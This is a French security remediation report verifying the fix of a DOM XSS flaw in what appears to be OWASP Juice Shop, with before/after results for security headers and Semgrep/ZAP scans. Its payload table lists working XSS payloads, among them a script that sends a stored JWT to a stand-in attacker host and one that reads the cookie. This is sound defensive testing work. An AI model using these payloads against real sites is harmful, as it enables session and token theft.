# V2 — Vérification de la correction (XSS DOM, CWE-79)

## 1. Rejeu des charges utiles

| Payload injecté dans `#/search?q=` | Avant | Après |
|---|---|---|
| `<iframe src="javascript:alert(\`xss\`)">` | Exécution JS (boîte d'alerte) | Chaîne affichée littéralement |
| `<img src=x onerror=alert(document.cookie)>` | Exécution JS + lecture du cookie | Chaîne affichée littéralement |
| `<svg/onload=alert(1)>` | Exécution JS | Chaîne affichée littéralement |
| `<script>fetch('//attaquant/'+localStorage.token)</script>` | Exfiltration du JWT | Aucun appel réseau sortant |

Contrôle DOM après correction (console du navigateur) :

```js
document.querySelector('h3 span').innerHTML
// -> "&lt;img src=x onerror=alert(1)&gt;"   (entités HTML, pas de nœud actif)
```

## 2. Vérification des en-têtes de sécurité

```bash
curl -sI http://localhost:3000/ | grep -Ei "content-security-policy|x-frame|x-content-type|strict-transport|x-powered-by"
```

| En-tête | Avant | Après |
|---|---|---|
| `Content-Security-Policy` | absent | `default-src 'self'; script-src 'self'; object-src 'none'` |
| `X-Frame-Options` | absent | `DENY` |
| `X-Content-Type-Options` | absent | `nosniff` |
| `Strict-Transport-Security` | absent | `max-age=31536000; includeSubDomains` |
| `X-Powered-By` | `Express` | supprimé |

## 3. Vérification outillée

| Outil | Avant | Après |
|---|---|---|
| Semgrep (`juiceshop-angular-bypass-security-trust`) | 1 finding ERROR | 0 finding |
| OWASP ZAP (règles 40012 / 40014 / 40016) | Alertes High sur `/#/search` | 0 alerte |
| OWASP ZAP (règle 10038 — CSP absent) | 1 alerte Medium | 0 alerte |
